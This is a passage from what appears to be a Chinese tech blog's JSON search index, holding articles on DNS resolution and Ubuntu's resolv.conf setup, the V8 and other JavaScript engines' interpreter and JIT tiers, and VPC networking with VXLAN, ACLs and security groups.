class=\"\">\n\n<ol>\n<li><p>操作系统会先检查自己<code>本地hosts</code>文件是否有这个网址映射关系，如果有，就先调用这个IP地址映射，完成域名解析。</p>\n</li>\n<li><p>如果hosts里没有这个域名的映射，则查找本地DNS解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。</p>\n</li>\n<li><p>如果hosts与本地DNS解析器缓存都没有相应的网址映射关系，首先会找TCP&#x2F;ip参数中设置的<code>首选DNS服务器</code>，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。</p>\n</li>\n<li><p>如果要查询的域名，不由本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析，此解析不具有权威性。</p>\n</li>\n<li><p>如果本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）进行查询.</p>\n<ul>\n<li><p>如果未用转发模式，本地DNS就把请求发至<code>13台根DNS</code>，根DNS服务器收到请求后会判断这个域名(.com)是谁来授权管理，并会返回一个负责该顶级域名服务器的一个IP。本地DNS服务器收到IP信息后，将会联系负责.com域的这台服务器。这台负责.com域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com域的下一级DNS服务器地址(qq.com)给本地DNS服务器。当本地DNS服务器收到这个地址后，就会找qq.com域服务器，重复上面的动作，进行查询，直至找到<a href=\"http://www.qq.com主机./\">www.qq.com主机。</a></p>\n</li>\n<li><p>如果用的是转发模式，此DNS服务器就会把请求转发至<code>上一级DNS服务器</code>，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，以此循环。不管是本地DNS服务器用是是转发，还是根提示，最后都是把结果返回给本地DNS服务器，由此DNS服务器再返回给客户机。</p>\n</li>\n</ul>\n</li>\n</ol>\n<p>从客户端到本地DNS服务器是属于递归查询，而DNS服务器之间就是的交互查询就是迭代查询。</p>\n<h2 id=\"如何配置-etc-resolv-conf\"><a href=\"#如何配置-etc-resolv-conf\" class=\"headerlink\" title=\"如何配置&#x2F;etc&#x2F;resolv.conf\"></a>如何配置&#x2F;etc&#x2F;resolv.conf</h2><p>在DNS设置中，最重要的配置文件就是<code>/etc/resolv.conf</code>，其中的关键字主要有四个，每行以一个关键字开头，后接一个或多个由空格隔开的参数，分别是：</p>\n<ul>\n<li><code>nameserver</code>  ：表示解析域名时使用该地址指定的主机为域名服务器。其中域名服务器是按照文件中出现的顺序来查询的,且只有当第一个nameserver没有反应时才查询下面的nameserver。</li>\n<li><code>domain</code>      ：声明主机的域名。很多程序用到它，如邮件系统；当为没有域名的主机进行DNS查询时，也要用到。如果没有域名，主机名将被使用，删除所有在第一个点( .)前面的内容。</li>\n<li><code>search</code>      ：它的多个参数指明域名查询顺序。当要查询没有域名的主机，主机将在由search声明的域中分别查找。<br>domain和search不能共存；如果同时存在，后面出现的将会被使用。</li>\n<li><code>sortlist</code>    ：允许将得到域名结果进行特定的排序。它的参数为网络&#x2F;掩码对，允许任意的排列顺序。</li>\n</ul>\n<p>下面我们给出一个&#x2F;etc&#x2F;resolv.conf的示例：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">domain  51osos.com</span><br><span class=\"line\">search  www.51osos.com  51osos.com</span><br><span class=\"line\">nameserver 202.102.192.68</span><br><span class=\"line\">nameserver 202.102.192.69</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Ubuntu-DNS设置的注意事项\"><a href=\"#Ubuntu-DNS设置的注意事项\" class=\"headerlink\" title=\"Ubuntu DNS设置的注意事项\"></a>Ubuntu DNS设置的注意事项</h2><p>在无网络条件下安装ubuntu，系统将自启动并运行<code>systemd-resolved</code>服务，在<code>127.0.0.53:53</code>保持侦听并提供DNS解析服务。<br>注意：Ubuntu将<code>/etc/resolv.conf</code>设置为软连接，并指向<code>/run/systemd/resolve/stub-resolv.conf</code>，其配置信息为：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:/etc# ls -l resolv.conf</span><br><span class=\"line\">lrwxrwxrwx 1 root root 39 Feb  3 18:22 resolv.conf -&gt; ../run/systemd/resolve/stub-resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:/etc# cat resolv.conf</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">This file is managed by man:systemd-resolved(8). Do not edit.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\"># This is a dynamic resolv.conf file for connecting local clients to the</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">internal DNS stub resolver of systemd-resolved. This file lists all</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">configured search domains.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\"># Run &quot;systemd-resolve --status&quot; to see details about the uplink DNS servers</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">currently <span class=\"keyword\">in</span> use.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\"># Third party programs must not access this file directly, but only through the</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">symlink at /etc/resolv.conf. To manage man:resolv.conf(5) <span class=\"keyword\">in</span> a different way,</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">replace this symlink by a static file or a different symlink.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\"># See man:systemd-resolved.service(8) for details about the supported modes of</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">operation <span class=\"keyword\">for</span> /etc/resolv.conf.</span></span><br><span class=\"line\"></span><br><span class=\"line\">nameserver 127.0.0.53</span><br><span class=\"line\">options edns0</span><br></pre></td></tr></table></figure>\n\n<hr>\n<p>参考文档：<br><a href=\"http://www.jinbuguo.com/systemd/systemd-resolved.service.html\">systemd-resolved.service 中文手册</a><br><a href=\"https://www.jianshu.com/p/590a8dfdf9a9\">搭建Kubernetes集群时DNS无法解析问题的处理过程</a><br><a href=\"https://www.jianshu.com/p/c1ccc5db1762\">ubuntu的DNS配置和管理</a><br><a href=\"https://www.cnblogs.com/marklove/p/9196045.html\">Ubuntu 18.04设置dns</a></p>\n"},{"title":"V8引擎技术简介","url":"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>2009年，Google启动了浏览器项目，V8引擎诞生的使命就是性能的极致，Google觉得这这种架构生成字节码会浪费时间，决定<strong>一步到位直接采用机器码</strong>。</p>\n<p>早期V8引擎包含了<code>Full-Codegen</code>和 <code>Crankshaft</code>(曲轴) 两个编译器，即：JS源代码会被V8引擎进行两次解析，第一次使用<code>Full-Codegen</code>进行快速编译，而第二次使用<code>Crankshaft</code>进行深度优化编译，其基本处理流程为：</p>\n<ol>\n<li>将js源代码转化成AST（抽象语法树）。</li>\n<li>通过<code>Full-Codegen</code>引擎编译AST变成<strong>基准的机器码</strong>，然后直接执行这些未经优化的二进制文件。</li>\n<li>在执行机器码的过程中，通过内置的<code>Profiler</code>分析器筛选出热点函数，将标记的代码通过<code>Crankshaft</code>引擎进行优化编译生成<strong>优化的机器码</strong>。</li>\n<li>再次运行到这个Javascript函数时，直接使用缓存中<strong>优化的机器码</strong>。</li>\n</ol>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/v8-arch-0.png\" class=\"\">\n\n<p>通过取消字节码环节，V8引擎的运行速度有了明显的提示，但随着Web网页的复杂性，尤其是在智能终端上的应用普及，这种架构也暴露了不少严重的缺陷：</p>\n<ul>\n<li><strong>内存占用过高</strong>：Full-Codegen生成机器码会占用大量内存，一个1M左右的JS源码文件通过编译生成的机器码通常达到10M+，而早期手机内存普遍有限，过度占用会导致性能大大降低</li>\n<li><strong>启动速度较慢</strong>：Full-Codegen编译直接生成机器码，需要较长的编译时间，导致应用启动的速度受到较大影响</li>\n<li><strong>跨平台支持难</strong>：Crankshaft直接生成机器码，需要自行适配不同的CPU架构，难以适应手机终端的复杂性</li>\n</ul>\n<p>上述架构问题的集中体现，就是2016年<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=593477\">Facebook报告的Chrome代码缓存失效Bug</a>。</p>\n<blockquote>\n<p>当时的Chrome浏览器重复加载Facebook主页，第一次加载时长165ms，但重复加载时发现时长几乎没有变化，说明真正耗时高的js代码并没有被缓存和优化。<br>导致该Bug的原因：为缓解二进制代码占用内存空间大的矛盾，V8采取了<strong>惰性编译</strong>的优化原则（即只对最外层的代码进行优化编译），而Facebook首页采用的<strong>IIFE</strong>（立即调用函数表达式，类似于闭包函数）代码封装方式，导致浏览器并未对IIFE函数的内部关键代码进行优化。</p>\n</blockquote>\n<h2 id=\"一、V8引擎的技术架构-字节码的回归\"><a href=\"#一、V8引擎的技术架构-字节码的回归\" class=\"headerlink\" title=\"一、V8引擎的技术架构 - 字节码的回归\"></a>一、V8引擎的技术架构 - 字节码的回归</h2><p>2017年，Google发布了V8 5.9版本，完全废弃并移除了<code>full-codegen</code>和 <code>Crankshaft</code>，新增了 <code>Ignition</code>（点火器）字节码解释器和<code>Turbofan</code>（涡轮风扇）优化编译器，标志着字节码技术的全面回归。</p>\n<ul>\n<li><code>Ignition</code>：本质上就是一个类似于Java中的JVM虚拟机，负责将AST编译成字节码，并逐句进行解释形成二进制代码并执行。</li>\n<li><code>Turbofan</code>：在解释执行的过程中，<code>Ignition</code>标记重复执行的热点代码，将相应的字节码提交给<code>Turbofan</code>，编译生成优化的机器码并缓存，今后再次运行到这个函数时便只执行机器码而非字节码</li>\n</ul>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/v8.jpg\" class=\"\">\n\n<p>也就是说，JS脚本有三种不同的启动方式：</p>\n<ul>\n<li><code>Cold load</code>冷启动: 首次加载脚本文件时，<code>Ignition</code>编译生成字节码文件并解释执行，没有任何数据缓存</li>\n<li><code>Warm load</code>暖启动：如果V8发现第二次使用了相同的脚本文件，将提交给<code>Turbofan</code>编译生成机器码文件，并与脚本文件一起加载到磁盘缓存中</li>\n<li><code>Hot load</code>热启动: 如果第三次加载相同的脚本文件，V8可以从磁盘缓存中载入脚本，并直接执行对应的机器码文件</li>\n</ul>\n<blockquote>\n<p>js文件加载的过程并不是由V8负责的，它可能来自于网络请求、本地的cache或者是也可以是来自service worker，浏览器的js加载过程是V8引擎的前置步骤。</p>\n</blockquote>\n<p>通过重新引入字节码技术，原有V8引擎存在的问题有了显著改善，体现在：</p>\n<ol>\n<li>首次启动时只需要编译出字节码，然后逐句执行字节码，编译出字节码的速度可远远快于编译出二进制代码的速度。</li>\n<li>字节码的数据量远远低于机器码，因此内存和磁盘的空间占用大大减少。</li>\n<li><code>Turbofan</code>直接利用<code>Ignition</code>已经生成的字节码进行编译优化，无需源代码的二次解析，代码复杂度和处理效率都有提升</li>\n<li>通过虚拟机和字节码技术适配不同CPU架构体系，引擎代码的复杂度大大降低。</li>\n</ol>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/bytecode.png\" class=\"\">\n\n<h2 id=\"二、JavaScriptCore的技术架构\"><a href=\"#二、JavaScriptCore的技术架构\" class=\"headerlink\" title=\"二、JavaScriptCore的技术架构\"></a>二、JavaScriptCore的技术架构</h2><p>JavaScriptCore（缩写为 JSC），是Apple 的 JavaScript 引擎，被用于 Safari 和 React Native 两个项目中。</p>\n<p>JavaScriptCore有四种不同的代码执行方式：</p>\n<h3 id=\"1-LLInt（Low-Level-Interpreter）-解释器模式\"><a href=\"#1-LLInt（Low-Level-Interpreter）-解释器模式\" class=\"headerlink\" title=\"1. LLInt（Low Level Interpreter）- 解释器模式\"></a>1. <code>LLInt</code>（Low Level Interpreter）- 解释器模式</h3><p><code>LLInt</code>是用跨平台的汇编语言实现的，负责逐条解释执行JSC虚机指令，JS代码的执行总是从LLInt模式开始的。<br>执行 Parser 生成的 Byte code。代码在 <code>llint/</code> 里，使用的汇编语言代码在 <code>offlineasm/</code> 里，可以编译为 x86 和 ARMv7 的汇编和 C 代码。<br><code>LLInt</code> 希望达成除了词法和语法分析外零启动消耗，同时遵守用 JIT 在调用，堆栈和起存器的约定。</p>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/webkit.png\" class=\"\">\n\n<h3 id=\"2-Baseline-基本的实时编译模式\"><a href=\"#2-Baseline-基本的实时编译模式\" class=\"headerlink\" title=\"2. Baseline - 基本的实时编译模式\"></a>2. <code>Baseline</code> - 基本的实时编译模式</h3><p><code>Baseline</code>只是做了简单的“机器码化”，减小了解释器按指令dispatch的开销，代码（指令序列）本身并未做任何优化。<br>在函数调用了6次，或者某段代码循环了大于100次会被触发。<br><code>BaseLine</code> 的代码在 <code>jit</code>&#x2F; 里。BaseLine JIT 还对几乎所有堆的访问执行了复杂的多态内联高速缓存（Polymorphic inline caches）。</p>\n<h3 id=\"3-DFG（Data-Flow-Graph）：低延迟优化的实时编译模式\"><a href=\"#3-DFG（Data-Flow-Graph）：低延迟优化的实时编译模式\" class=\"headerlink\" title=\"3. DFG（Data Flow Graph）：低延迟优化的实时编译模式\"></a>3. <code>DFG（Data Flow Graph）</code>：低延迟优化的实时编译模式</h3><p>如果<code>Baseline</code>性能不足，就用<code>DFG</code>生成更优化的机器码来执行。<br>在函数被调用了60次或者代码循环了1000次会触发。<br><code>DFG</code>会把字节码转成CPS形式（Continuation-Passing Style）后编译成机器码，目的是减少后续生成代码时需添加的类型检查逻辑。<br>编译时计算常量数据，并将它传播到相关代码中，达到整体简化代码的目的。<br>启用了多种常规的编译优化，包括：寄存器分配、控制流图简化、公共子表达式消除、无用代码消除、稀疏有条件的常量传播等。<br><code>DFG</code>代码在 <code>dfg/</code> 里。定期评估优化效果，如果更差性能，将回退到<code>Baseline</code>，看情况再次决定是否调用<code>DFG</code>。</p>\n<h3 id=\"4-FTL（Faster-Than-Light）：高吞吐量优化的实时编译模式\"><a href=\"#4-FTL（Faster-Than-Light）：高吞吐量优化的实时编译模式\" class=\"headerlink\" title=\"4. FTL（Faster Than Light）：高吞吐量优化的实时编译模式\"></a>4. <code>FTL（Faster Than Light）</code>：高吞吐量优化的实时编译模式</h3><p><code>FTL</code>主要是配合后端进行优化，之前是使用的<code>LLVM</code>后端，后来为了减少内存开销，对LLVM进行了裁剪并改名为<code>B3</code>。<br>复用了DFG的大部分流程，将原DFG流程中的DFG后端替换为新的FTL流程，重点优化如下内容：CPS转SSA、SSA转LLVM IR、LLVM IR的编译优化、IR转机器码等。</p>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/jsc-2.png\" class=\"\">\n\n<h2 id=\"三、其它浏览器的技术架构\"><a href=\"#三、其它浏览器的技术架构\" class=\"headerlink\" title=\"三、其它浏览器的技术架构\"></a>三、其它浏览器的技术架构</h2><p><code>SpiderMonkey</code>，是在 Firefox 和 SpiderNode 中使用的 Mozilla 的 JavaScript 引擎，包含了两个优化编译器。<br>&#96;</p>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/firefox.jpg\" class=\"\">\n\n<ul>\n<li>解释器将代码解释给<code>Baseline</code>编译器，该编译器可以生成部分优化的代码。</li>\n<li>结合运行代码时收集的分析数据，<code>IonMonkey</code>编译器可以生成高度优化的代码。</li>\n<li>如果尝试优化失败，IonMonkey 将回退到 Baseline 阶段的代码。</li>\n</ul>\n<p><code>Chakra</code>，是用于 Edge 和 Node-ChakraCore 两个项目的微软 JavaScript 引擎，与<code>SpiderMonkey</code>非常类似，也有类似两个优化编译器的设置。</p>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/edge.jpg\" class=\"\">\n\n<ul>\n<li>解释器将字节码提交给 <code>SimpleJIT</code>，生成部分优化的机器码</li>\n<li>结合解释器的运行分析数据，<code>FullJIT</code>生成深度优化的机器吗</li>\n</ul>\n<h2 id=\"四、基本结论\"><a href=\"#四、基本结论\" class=\"headerlink\" title=\"四、基本结论\"></a>四、基本结论</h2><h3 id=\"1-黄金组合-字节码解释器-JIT-编译器\"><a href=\"#1-黄金组合-字节码解释器-JIT-编译器\" class=\"headerlink\" title=\"1. 黄金组合 &#x3D; 字节码解释器 + JIT 编译器\"></a>1. 黄金组合 &#x3D; 字节码解释器 + JIT 编译器</h3><p>解释器技术和编译器技术的历史悠久，各有所长，通过多年的发展正在逐步走向融合，已经成为现代主流浏览器的普遍共识。<br>以<code>Ignition</code> + <code>TurboFan</code>为例，</p>\n<ul>\n<li>首先，解释器完成字节码编译并快速启动应用，同时收集执行信息并记录热点代码</li>\n<li>后台的JIT编译器把字节码编译成高效机器码，并缓存到磁盘文件</li>\n<li>后续启动时，只执行优化后的高效机器码，而不再解释执行字节码</li>\n</ul>\n<h3 id=\"2-为什么需要多个不同的编译器？\"><a href=\"#2-为什么需要多个不同的编译器？\" class=\"headerlink\" title=\"2. 为什么需要多个不同的编译器？\"></a>2. 为什么需要多个不同的编译器？</h3><p>这完全是一些折衷的取舍。一方面，解释器可以快速生成字节码，但字节码的执行速度（不是启动速度）通常不够快。另一方面，优化编译器处理需要更长的时间，但最终会生成更高效的机器码。到底是快速获取可执行的代码（解释器），还是花费更多时间但最终以最佳性能运行代码（优化编译器），这其中包含一个平衡点。<br>因此，现代JS引擎通常选择同时提供几个不同特性的优化编译器，以更高的复杂性为代价来对这些折衷点进行更细粒度的控制。</p>\n<h3 id=\"3-影响编译器性能的关键技术\"><a href=\"#3-影响编译器性能的关键技术\" class=\"headerlink\" title=\"3. 影响编译器性能的关键技术\"></a>3. 影响编译器性能的关键技术</h3><ul>\n<li>词法分析 Scanner 、语法分析 Parser 和 抽象语法树 AST</li>\n<li>字节码设计，基于栈或者基于寄存器的虚拟机</li>\n<li>内联缓存（Inline Cache）</li>\n<li>内存管理和垃圾回收策略（Garbage Collection）</li>\n<li>多线程管理和消息队列</li>\n</ul>\n<p>本文暂不展开，先点个题备着，未来还将继续研究！</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方资料\"><a href=\"#官方资料\" class=\"headerlink\" title=\"官方资料\"></a>官方资料</h3><ul>\n<li><a href=\"https://v8.dev/blog/10-years\">V8引擎的十年之路 - Google官方</a></li>\n<li><a href=\"https://github.com/v8/v8\">V8引擎的Github主页</a></li>\n<li><a href=\"Google%E5%85%B3%E4%BA%8Eignition%E7%9A%84%E4%BB%8B%E7%BB%8D.pptx\">PPT下载：Iginition: 快速启动的V8解释器 - Ross McIlroy</a></li>\n</ul>\n<h3 id=\"技术研究\"><a href=\"#技术研究\" class=\"headerlink\" title=\"技术研究\"></a>技术研究</h3><ul>\n<li><a href=\"https://juejin.cn/post/6844904152745639949\">V8引擎详解系列 - 阿里巴巴暮桥</a></li>\n<li><a href=\"https://juejin.cn/post/7018468848886579214\">Google V8引擎浅析 - 字节跳动ELab团队</a></li>\n<li><a href=\"https://juejin.cn/post/6984302939095449608\">深入理解JavaScript的V8引擎</a></li>\n<li><a href=\"https://juejin.cn/post/6844903622333956103\">深入了解 JavaScript 引擎精华</a></li>\n<li><a href=\"https://juejin.cn/post/6890187786045882375\">初识 JavaScriptCore JIT</a></li>\n</ul>\n<h3 id=\"视频资料\"><a href=\"#视频资料\" class=\"headerlink\" title=\"视频资料\"></a>视频资料</h3><ul>\n<li><a href=\"https://www.youtube.com/watch?v=5nmpokoRaZI\">Mathias 和 Benedikt 在 JSConf EU 2018 的视频</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=mtVBAcy7AKA\">Michael Saboff 关于 JavaScriptCore 的视频</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1FJ411E7Sf/\">V8 Ignition 解释器的字节码（Bytecodes）- B站课程</a></li>\n</ul>\n"},{"title":"VPC网络规划的关键技术分析","url":"/2021/06/27/VPC%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<h2 id=\"一、vxLan技术的应用\"><a href=\"#一、vxLan技术的应用\" class=\"headerlink\" title=\"一、vxLan技术的应用\"></a>一、vxLan技术的应用</h2><h3 id=\"经典网络的问题\"><a href=\"#经典网络的问题\" class=\"headerlink\" title=\"经典网络的问题\"></a>经典网络的问题</h3><p>传统IDC一般采用基于Vlan的经典网络，其特点是：</p>\n<ul>\n<li>首先进行安全规划划分为若干个安全域，一个维度是用户归属的管理权限，例如每个法人主体各自一个安全域；另一个维度是安全级别，例如互联网接口域、DMZ域、核心域等</li>\n<li>为每个安全域设立硬件防火墙，确保网络资源的物理隔离</li>\n<li>在每个安全域内部，所有用户共享公共网络资源池，用户之间不做逻辑隔离，或者基于<code>VLan</code>进行逻辑隔离。用户的内网IP由系统统一分配，相同的内网IP无法分配给不同用户。</li>\n</ul>\n<p>但是，对于大规模的公有云来说，如果采用VLAN，每个用户一个二层网络，那最多只能带4096多个用户，公有云许多用户还是只有1-2个云主机那种，那必然不能满足公有云的需求，所以在早期的经典网络模式下，不得不让多个用户挤在一个二层网络里面，仅仅要确保IP地址不重合，就是一件非常困难的事情，更无法实现细粒度的网络隔离和安全控制。</p>\n<h3 id=\"VxLan的协议格式\"><a href=\"#VxLan的协议格式\" class=\"headerlink\" title=\"VxLan的协议格式\"></a>VxLan的协议格式</h3><p>虚拟可扩展局域网（VXLAN）是一项网络虚拟化覆盖技术。通过在 IP-UDP 隧穿封装中使用 MAC，它可在共享第 3 层底层基础设施网络上，提供第 2 层扩展。在覆盖网络中获得第 2 层扩展的目的是，消除物理服务器堆叠现象，或突破地理位置界线，并且在数据中心内部或数据中心间，灵活地部署工作负载。</p>\n<p>最初的 IETF VXLAN 标准（RFC7348）定义了一个基于组播的洪泛和学习 VXLAN，无控制平面。它依靠数据驱动的洪泛和学习行为，来发现远程 VTEP 对等设备和学习远端主机。覆盖广播，即未知单播和组播（BUM）流量被封装到组播 VXLAN 分组中，通过底层组播转发，传送到远程 VTEP 交换机。这种部署中，洪泛会给解决方案可扩展性带来挑战。此外，该解决方案的另一问题是，需要在底层网络中启用组播功能，而部分机构不希望在数据中心和&#x2F;或广域网中启用组播。</p>\n<img src=\"/2021/06/27/VPC%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/baowen.png\" class=\"\">\n\n<ul>\n<li>VXLAN数据包封装在UDP中，使用物理网络的IP和MAC地址为头部进行封装，网络通信而言只是个参数。</li>\n<li>VXLAN标准灰色部分有VNID即VNI，24bits支持千万级别。</li>\n<li>通过UDP延伸二层网络，用户可以自定制虚拟化网络，不需要关注虚拟机的MAC地址。</li>\n</ul>\n<p>虽然VXLAN协议通过UDP NVO3技术解决了网络扩展和迁移的问题，但是也会有一些缺点:</p>\n<ul>\n<li>因为采用的UDP延伸二层网络，它执行的是租户的执行隔离而流量完全没有加密，最直接的方案是通过IPsec进行加密，因为流量加密对于公有云来说很重要！！！</li>\n<li>VXLAN协议添加了很多字节固定开销。</li>\n<li>多播和组播基于VXLAN协议下要特别考虑网络洪泛BUM影响问题和网络设计，多播在Linux不可用时可以考虑BGP EVPN的方式。</li>\n<li>Linux VXLAN不支持IGMP,可以通过FDB实现方式来解决。</li>\n<li>由于VXLAN是一个通用的网络协议标准，各厂商对VXLAN实现的协议标准的保留字段会有不一致的地方，当使用华为和华三的网络设备业务层面需要抽象另外一层来实现解耦。</li>\n</ul>\n<h3 id=\"VxLan的网络模型\"><a href=\"#VxLan的网络模型\" class=\"headerlink\" title=\"VxLan的网络模型\"></a>VxLan的网络模型</h3><img src=\"/2021/06/27/VPC%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/vxlan.png\" class=\"\">\n\n<ul>\n<li><p><code>Overlay和Underlay</code>网络：物理网络作为Underlay网络，在其上构建出 虚拟的二层或三层网络，即Overlay网络。OverLay是基于隧道实现的，流量需要跑在UnderLay之上。</p>\n</li>\n<li><p><code>NVE</code>:实现网络虚拟化的网络实体，报文经过NVE封装转换后，NVE间就可基于三层网络建立二层虚拟化网络。</p>\n</li>\n<li><p><code>VTEP隧道终点</code>：封装在NVE实体中，主要用于VXLAN报文的封装和解装，一个VTEP地址对应一个VXLAN隧道,VXLAN报文中的源IP地址为本节点的VTEP地址，目的ip地址为对端VTEP地址。</p>\n</li>\n<li><p><code>VNI</code>：网络标识，主要用于区分VXLAN段，租户和VNI映射。</p>\n</li>\n</ul>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><ol>\n<li><p>Overlay网络的优点简单说就两句话：一是在三层网络中利用封装技术提高二层网络扩展性的同时规避了传统二层网络的种种弊端；二是通过引入VNID的概念，满足了云计算多租户vlan不够，以及租户间网络隔离的问题。</p>\n</li>\n<li><p>Overlay技术的诞生实际就是为了解决云计算大环境下传统网络的种种问题，从它的技术构想到落地方案都是按照云计算的思路来的，所以对于一个规模较小且相对稳定的网络环境中是没有必要用overlay技术的，用了反而把网络搞复杂了。</p>\n</li>\n<li><p>Overlay的所有技术路线中，VXLAN的运用最广泛，得到了最多的主流网络厂商的支持，未来很长一段时间里很可能成为overlay技术的代名词；</p>\n</li>\n</ol>\n<h2 id=\"二、网络ACL-VS-安全组\"><a href=\"#二、网络ACL-VS-安全组\" class=\"headerlink\" title=\"二、网络ACL VS 安全组\"></a>二、网络ACL VS 安全组</h2><p>防火墙主要是做南北向的访问控制，作用范围是VPC及其子网；安全组主要是做东西向的访问控制，作用范围是虚拟机网卡。</p>\n<img src=\"/2021/06/27/VPC%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/vpc-infra.png\" class=\"\">\n\n<blockquote>\n<p>从流量的角度来看，VPC访问路径依次是：<br>外部网络 –&gt; VPC路由器 –&gt; 所在子网的ACL过滤–&gt; 虚拟机网卡的安全组过滤 –&gt; 业务应用</p>\n</blockquote>\n<h3 id=\"ACL的工作方式\"><a href=\"#ACL的工作方式\" class=\"headerlink\" title=\"ACL的工作方式\"></a>ACL的工作方式</h3><ul>\n<li>防火墙作用在VPC路由器上，属于集中式的VPC边缘设备，为整个VPC提供访问控制。防火墙的配置是动态生效的，即时的配置会马上作用到VPC路由器接口；</li>\n<li>数据包进入防火墙时，根据规则集的规则优先级进行逐条匹配，如果匹配上了，则执行规则的行为；如果没有匹配上，则执行规则集的默认行为。</li>\n<li>防火墙可以针对不同报文状态来进行过滤，如new、established、invalid、related；也可以针对常见的协议，如TCP、UDP、VRRP、ICMP等。同时，如果协议是TCP或者ICMP，防火墙提供了更加细粒度的过滤规则，能够针对ICMP的类型、TCP的flag进行匹配，进一步细化策略，满足更多的使用场景。</li>\n</ul>\n<h3 id=\"安全组的工作方式\"><a href=\"#安全组的工作方式\" class=\"headerlink\" title=\"安全组的工作方式\"></a>安全组的工作方式</h3><p>Linux网络虚拟化支持linux bridge以及openvswitch（简称OVS），OpenStack Neutron ml2驱动二者都支持，目前大多数使用的是OVS。</p>\n<p>不过早期的iptables不支持OVS bridge以及port，因此为了实现安全组，虚拟机的tap设备并不是直接连接到OVS bridge上，而是中间加了一个Linux bridge，通过veth pair连接Linux bridge以及OVS bridege，这样就可以在Linux bridge上添加iptables规则实现安全组功能了。</p>\n<ul>\n<li>安全组作用于虚拟机的虚拟网卡上，给虚拟机提供三层网络的访问控制，支持入方向、出方向的过滤；</li>\n<li>安全组是一个分布式的访问控制，可以对TCP&#x2F;UDP&#x2F;ICMP等协议进行有效过滤；也可以直接匹配所有协议；可以根据数据包的源IP进行过滤。</li>\n</ul>\n<h3 id=\"小结2\"><a href=\"#小结2\" class=\"headerlink\" title=\"小结2\"></a>小结2</h3><p>从安全的角度来看，在离威胁源更近的地方进行防护是更好的方式。<br>一般来说，南北向交给防火墙来做，安全组作为防火墙的补充，是云主机安全的最后防线。<br>安全组和防火墙是相辅相成的，两者有机结合，才能够更好的做云主机的安全防护。</p>\n<img src=\"/2021/06/27/VPC%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/vs.png\" class=\"\">\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a 